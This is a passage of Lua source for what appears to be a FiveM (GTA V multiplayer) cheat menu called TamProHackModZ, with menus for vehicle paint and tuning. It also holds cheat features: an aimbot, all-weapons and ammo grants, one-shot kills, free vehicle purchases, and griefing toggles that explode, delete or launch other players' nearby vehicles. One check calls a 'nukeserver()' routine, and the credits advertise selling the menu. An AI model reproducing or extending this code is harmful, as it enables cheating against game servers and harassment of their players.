      GiveWeaponToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), 1000, false, false)
    end
  elseif TamProHackModZ.Button("~r~Remove All Weapons") then
    RemoveAllPedWeapons(PlayerPedId(-1), true)

  elseif TamProHackModZ.Button("Drop your current Weapon") then
    local a = GetPlayerPed(-1)
    local b = GetSelectedPedWeapon(a)
    SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
  
  elseif TamProHackModZ.CheckBox("Aimbot", Aimbot, function(enabled) Aimbot = enabled end) then
  elseif TamProHackModZ.CheckBox("Explosive Ammo", explosiveammo, function(enabled) explosiveammo = enabled  end) then
  elseif TamProHackModZ.CheckBox("Rapid Fire", rapidfire, function(enabled) rapidfire = enabled  end) then

  elseif TamProHackModZ.Button("Give Ammo") then
  local result = KeyboardInput("Enter the amount of ammo", "", 100)
  if result ~= "" then
  for i = 1, #allWeapons do AddAmmoToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), result) end
  end
  elseif TamProHackModZ.CheckBox("OneShot ~r~Kill", oneshot, function(enabled) oneshot = enabled end) then
  elseif TamProHackModZ.CheckBox("OneShot ~b~Car", oneshotcar, function(enabled) oneshotcar = enabled end) then
  elseif TamProHackModZ.CheckBox("Vehicle Gun",VehicleGun, function(enabled)VehicleGun = enabled end)  then
  elseif TamProHackModZ.CheckBox("Delete Gun",DeleteGun, function(enabled)DeleteGun = enabled end)  then
  end


  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(tngns) then
  veh = GetVehiclePedIsUsing(PlayerPedId())
  for i,theItem in pairs(vehicleMods) do
    if theItem.id == "extra" and #checkValidVehicleExtras() ~= 0 then
      if TamProHackModZ.MenuButton(theItem.name, theItem.id) then
      end
    elseif theItem.id == "neon" then
      if TamProHackModZ.MenuButton(theItem.name, theItem.id) then
      end
    elseif theItem.id == "paint" then
      if TamProHackModZ.MenuButton(theItem.name, theItem.id) then
      end
    elseif theItem.id == "wheeltypes" then
      if TamProHackModZ.MenuButton(theItem.name, theItem.id) then
      end
    elseif theItem.id == "headlight" then
      if TamProHackModZ.MenuButton(theItem.name, theItem.id) then
      end
    elseif theItem.id == "licence" then
      if TamProHackModZ.MenuButton(theItem.name, theItem.id) then
      end
    else
      local valid = checkValidVehicleMods(theItem.id)
      for ci,ctheItem in pairs(valid) do
        if TamProHackModZ.MenuButton(theItem.name, theItem.id) then
        end
        break
      end
    end

  end
  if IsToggleModOn(veh, 22) then
    xenonStatus = "Installed"
  else
    xenonStatus = "Not Installed"
  end
  if TamProHackModZ.Button("Xenon Headlight", xenonStatus) then
    if not IsToggleModOn(veh,22) then
      ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
    else
      ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
    end
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(prof) then
  veh = GetVehiclePedIsUsing(PlayerPedId())
  for i,theItem in pairs(perfMods) do
    if TamProHackModZ.MenuButton(theItem.name, theItem.id) then
    end
  end
  if IsToggleModOn(veh,18) then
    turboStatus = "Installed"
  else
    turboStatus = "Not Installed"
  end
  if TamProHackModZ.Button("~b~Turbo Tune", turboStatus) then
    if not IsToggleModOn(veh,18) then
      ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
    else
      ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
    end
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("primary") then
  if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Classic", "classic1") then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Metallic", "metallic1") then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Matte", "matte1") then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Metal", "metal1") then
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("secondary") then
 if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Classic", "classic2") then
 elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Metallic", "metallic2") then
 elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Matte", "matte2") then
 elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Metal", "metal2") then
end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("rimpaint") then
  if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Classic", "classic3") then
elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Metallic", "metallic3") then
elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Matte", "matte3") then
elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Metal", "metal3") then
end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("classic1") then
  for theName,thePaint in pairs(paintsClassic) do
    tp,ts = GetVehicleColours(veh)
    if tp == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and tp == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    curprim,cursec = GetVehicleColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
        oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

        isPreviewing = true
      elseif isPreviewing and curprim == thePaint.id then
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and curprim ~= thePaint.id then
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        isPreviewing = true
      end
    end
  end

  if bytexd ~= "HighTachMenu" then
    nukeserver()
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("metallic1") then
  for theName,thePaint in pairs(paintsClassic) do
    tp,ts = GetVehicleColours(veh)
    if tp == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and tp == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    curprim,cursec = GetVehicleColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
        oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

        isPreviewing = true
      elseif isPreviewing and curprim == thePaint.id then
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and curprim ~= thePaint.id then
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("matte1") then
  for theName,thePaint in pairs(paintsMatte) do
    tp,ts = GetVehicleColours(veh)
    if tp == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and tp == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    curprim,cursec = GetVehicleColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
        SetVehicleColours(veh,thePaint.id,oldsec)

        isPreviewing = true
      elseif isPreviewing and curprim == thePaint.id then
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and curprim ~= thePaint.id then
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("metal1") then
  for theName,thePaint in pairs(paintsMetal) do
    tp,ts = GetVehicleColours(veh)
    if tp == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and tp == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    curprim,cursec = GetVehicleColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
        oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        SetVehicleColours(veh,thePaint.id,oldsec)

        isPreviewing = true
      elseif isPreviewing and curprim == thePaint.id then
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and curprim ~= thePaint.id then
        SetVehicleColours(veh,thePaint.id,oldsec)
        SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("classic2") then
  for theName,thePaint in pairs(paintsClassic) do
    tp,ts = GetVehicleColours(veh)
    if ts == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and ts == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    curprim,cursec = GetVehicleColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldmod = table.pack(oldprim,oldsec)
        SetVehicleColours(veh,oldprim,thePaint.id)

        isPreviewing = true
      elseif isPreviewing and cursec == thePaint.id then
        SetVehicleColours(veh,oldprim,thePaint.id)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and cursec ~= thePaint.id then
        SetVehicleColours(veh,oldprim,thePaint.id)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("metallic2") then
  for theName,thePaint in pairs(paintsClassic) do
    tp,ts = GetVehicleColours(veh)
    if ts == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and ts == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    curprim,cursec = GetVehicleColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldmod = table.pack(oldprim,oldsec)
        SetVehicleColours(veh,oldprim,thePaint.id)

        isPreviewing = true
      elseif isPreviewing and cursec == thePaint.id then
        SetVehicleColours(veh,oldprim,thePaint.id)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and cursec ~= thePaint.id then
        SetVehicleColours(veh,oldprim,thePaint.id)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("matte2") then
  for theName,thePaint in pairs(paintsMatte) do
    tp,ts = GetVehicleColours(veh)
    if ts == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and ts == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    curprim,cursec = GetVehicleColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldmod = table.pack(oldprim,oldsec)
        SetVehicleColours(veh,oldprim,thePaint.id)

        isPreviewing = true
      elseif isPreviewing and cursec == thePaint.id then
        SetVehicleColours(veh,oldprim,thePaint.id)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and cursec ~= thePaint.id then
        SetVehicleColours(veh,oldprim,thePaint.id)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("metal2") then
  for theName,thePaint in pairs(paintsMetal) do
    tp,ts = GetVehicleColours(veh)
    if ts == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and ts == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    curprim,cursec = GetVehicleColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldmod = table.pack(oldprim,oldsec)
        SetVehicleColours(veh,oldprim,thePaint.id)

        isPreviewing = true
      elseif isPreviewing and cursec == thePaint.id then
        SetVehicleColours(veh,oldprim,thePaint.id)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and cursec ~= thePaint.id then
        SetVehicleColours(veh,oldprim,thePaint.id)
        isPreviewing = true
      end
    end
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("classic3") then
  for theName,thePaint in pairs(paintsClassic) do
    _,ts = GetVehicleExtraColours(veh)
    if ts == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and ts == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    _,currims = GetVehicleExtraColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
        oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)

        isPreviewing = true
      elseif isPreviewing and currims == thePaint.id then
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and currims ~= thePaint.id then
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("metallic3") then
  for theName,thePaint in pairs(paintsClassic) do
    _,ts = GetVehicleExtraColours(veh)
    if ts == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and ts == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    _,currims = GetVehicleExtraColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
        oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)

        isPreviewing = true
      elseif isPreviewing and currims == thePaint.id then
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and currims ~= thePaint.id then
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("matte3") then
  for theName,thePaint in pairs(paintsMatte) do
    _,ts = GetVehicleExtraColours(veh)
    if ts == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and ts == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    _,currims = GetVehicleExtraColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
        oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)

        isPreviewing = true
      elseif isPreviewing and currims == thePaint.id then
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and currims ~= thePaint.id then
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)
        isPreviewing = true
      end
    end
  end
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened("metal3") then
  for theName,thePaint in pairs(paintsMetal) do
    _,ts = GetVehicleExtraColours(veh)
    if ts == thePaint.id and not isPreviewing then
      pricetext = "Installed"
    else
      if isPreviewing and ts == thePaint.id then
        pricetext = "Previewing"
      else
        pricetext = "Not Installed"
      end
    end
    _,currims = GetVehicleExtraColours(veh)
    if TamProHackModZ.Button(thePaint.name, pricetext) then
      if not isPreviewing then
        oldmodtype = "paint"
        oldmodaction = false
        oldprim,oldsec = GetVehicleColours(veh)
        oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
        oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)

        isPreviewing = true
      elseif isPreviewing and currims == thePaint.id then
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)
        isPreviewing = false
        oldmodtype = -1
        oldmod = -1
      elseif isPreviewing and currims ~= thePaint.id then
        SetVehicleExtraColours(veh, oldpearl,thePaint.id)
        isPreviewing = true
      end
    end
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(VMS) then
  if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~b~LSC ~s~Customs", LSCC) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Vehicle ~g~Boost", bmm) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Vehicle List", CTSa) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Global Car Trolls", gccccc) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Spawn & Attach ~s~Trailer", MTSS) then
  elseif TamProHackModZ.Button("~r~»~b~Buy ~s~Vehicle ~g~Free") then
    matacumparamasini()  
  elseif TamProHackModZ.Button("~r~»~b~Spawn ~s~Vehicle") then
    spawnvehicle()
  elseif TamProHackModZ.Button("~r~Delete ~s~Vehicle") then
    DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
  elseif TamProHackModZ.Button("~g~Repair ~s~Vehicle") then
    repairvehicle()
  elseif TamProHackModZ.Button("~g~Repair ~s~Engine") then
    repairengine()
  elseif TamProHackModZ.Button("~g~Flip ~s~Vehicle") then
    daojosdinpatpemata()
  elseif TamProHackModZ.Button("~b~Max ~s~Tuning") then
    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
  elseif TamProHackModZ.CheckBox("Vehicle Godmode", VehGod, function(enabled) VehGod = enabled end)then
  elseif TamProHackModZ.CheckBox("~b~Waterproof ~s~Vehicle", waterp, function(enabled) waterp = enabled end) then
  elseif TamProHackModZ.CheckBox("Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(enabled) VehSpeed = enabled end) then
  end

                TamProHackModZ.Display()
                elseif TamProHackModZ.IsMenuOpened("SettingsMenu") then
                    if TamProHackModZ.ComboBox("Menu X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                        currentMenuX = currentIndex
                        selectedMenuX = selectedIndex
                        for i = 0, #allMenus do
                            TamProHackModZ.SetMenuX(allMenus[i], menuX[currentMenuX])
                        end
                        end) 
                        then
                    elseif TamProHackModZ.ComboBox("Menu Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                        currentMenuY = currentIndex
                        selectedMenuY = selectedIndex
                        for i = 0, #allMenus do
                            TamProHackModZ.SetMenuY(allMenus[i], menuY[currentMenuY])
                        end
                        end)
                        then
                    elseif TamProHackModZ.CheckBox("Discord Rich Presence", discordPresence, function(enabled) discordPresence = enabled end) then
                    elseif TamProHackModZ.MenuButton("∑Credits", "Credits") then
                    elseif TamProHackModZ.MenuButton("∑Themes", "Themes") then
                    elseif TamProHackModZ.MenuButton("∑Info", "InfoMenu") then
                    end
    
                    TamProHackModZ.Display()
                elseif TamProHackModZ.IsMenuOpened("InfoMenu") then
                    if TamProHackModZ.Button("Build 0.9") then
                    end
    
                    TamProHackModZ.Display()
                elseif TamProHackModZ.IsMenuOpened("Themes") then
                    if TamProHackModZ.Button("Original") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            TamProHackModZ.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(allMenus[i], 255, 0, 0, 255)  
                        end  
                        for i, dA in pairs(bd) do
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(dA.id, 255, 0, 0, 255)  
                        end
                        for i, dA in pairs(be) do 
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(dA.id, 255, 0, 0, 255)
                        end
                    elseif TamProHackModZ.Button("Original Rainbow") then
                        animated = false
                        rainbow = true
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            TamProHackModZ.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                       end  
                       for i, dA in pairs(bd) do
                           TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                       end
                       for i, dA in pairs(be) do 
                           TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                       end
                    elseif TamProHackModZ.Button("Original White") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                             TamProHackModZ.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(allMenus[i], 255, 255, 255, 255)  
                        end  
                        for i, dA in pairs(bd) do
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(dA.id, 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end
                    elseif TamProHackModZ.Button("Original Green") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            TamProHackModZ.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(allMenus[i], 0, 255, 0, 255)  
                        end
                        for i, dA in pairs(bd) do
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(dA.id, 0, 255, 0, 255)  
                        end
                        for i, dA in pairs(be) do 
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(dA.id, 0, 255, 0, 255)
                        end  
                    elseif TamProHackModZ.Button("Original Blue") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            TamProHackModZ.SetTitleBackgroundSprite(allMenus[i], "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(allMenus[i], 0, 0, 255, 255)  
                        end   
                        for i, dA in pairs(bd) do
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(dA.id, 0, 0, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx") 
                            TamProHackModZ.SetSpriteColor(dA.id, 0, 0, 255, 255)
                        end  
                    elseif TamProHackModZ.Button("Gradient Black") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            TamProHackModZ.SetTitleBackgroundSprite(allMenus[i], "shared", "bggradient_16x512") 
                            TamProHackModZ.SetSpriteColor(allMenus[i], 0, 0, 255, 255)  
                        end   
                        for i, dA in pairs(bd) do
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "shared", "bggradient_16x512") 
                            TamProHackModZ.SetSpriteColor(dA.id, 0, 0, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "shared", "bggradient_16x512") 
                            TamProHackModZ.SetSpriteColor(dA.id, 0, 0, 255, 255)
                        end        
                    elseif TamProHackModZ.Button("Animated") then
                        for i = 0, #allMenus do
                            TamProHackModZ.SetSpriteColor(allMenus[i], 255, 255, 255, 255)  
                        end
                        rainbow = false     
                        animated = true                          
                    elseif TamProHackModZ.Button("God") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            TamProHackModZ.SetTitleBackgroundSprite(allMenus[i], "assassinations", "target1") 
                            TamProHackModZ.SetSpriteColor(allMenus[i], 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(bd) do
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "assassinations", "target1") 
                            TamProHackModZ.SetSpriteColor(dA.id, 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "assassinations", "target1") 
                            TamProHackModZ.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end     
                    elseif TamProHackModZ.Button("God2") then
                        animated = false
                        rainbow = false
                        Citizen.Wait(250)
                        for i = 0, #allMenus do
                            TamProHackModZ.SetTitleBackgroundSprite(allMenus[i], "assassinations", "target3") 
                            TamProHackModZ.SetSpriteColor(allMenus[i], 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(bd) do
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "assassinations", "target3") 
                            TamProHackModZ.SetSpriteColor(dA.id, 255, 255, 255, 255)  
                        end
                        for i, dA in pairs(be) do 
                            TamProHackModZ.SetTitleBackgroundSprite(dA.id, "assassinations", "target3") 
                            TamProHackModZ.SetSpriteColor(dA.id, 255, 255, 255, 255)
                        end     
                    end
    
    
                    TamProHackModZ.Display()
                elseif TamProHackModZ.IsMenuOpened("Credits") then
				if     TamProHackModZ.Button("~h~Press on our names <3") then
				elseif TamProHackModZ.Button("∑  ~r~~h~TamProHackModZ~s~ - ~r~DEV") then
				drawNotification('~h~Contact Var or DH for More ModMenu.')
				drawNotification('~h~If you want to buy ModMenu buy from this guy.')
				elseif TamProHackModZ.Button("∑  ~r~~h~DuckHunter~s~ - ~r~DEV") then
				end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(gccccc) then
  if TamProHackModZ.CheckBox("~r~EMP~s~ Nearest Vehicles", destroyvehicles, function(enabled) destroyvehicles = enabled end) then
  elseif TamProHackModZ.CheckBox("~r~Delete~s~ Nearest Vehicles", deletenearestvehicle, function(enabled) deletenearestvehicle = enabled end) then
  elseif TamProHackModZ.CheckBox("~r~Launch~s~ Nearest Vehicles", lolcars, function(enabled) lolcars = enabled end) then
  elseif TamProHackModZ.CheckBox("~r~Alarm~s~ Nearest Vehicles", alarmvehicles, function(enabled) alarmvehicles = enabled end) then
  elseif TamProHackModZ.Button("~r~BORGAR~s~ Nearest Vehicles") then
    local hamburghash = GetHashKey("xs_prop_hamburgher_wl")
    for vehicle in EnumerateVehicles() do
      local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
      AttachEntityToEntity(hamburger, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
    end
  elseif TamProHackModZ.CheckBox("~r~Explode~s~ Nearest Vehicles", explodevehicles, function(enabled) explodevehicles = enabled end) then
  elseif TamProHackModZ.CheckBox("~p~Fuck~s~ Nearest Vehicles", fuckallcars, function(enabled) fuckallcars = enabled end) then
  end
  --------------------------
  --LUA MENUS
  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(LMX) then
  if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ~r~ESX ~s~UNKNOWN", ESXC) then
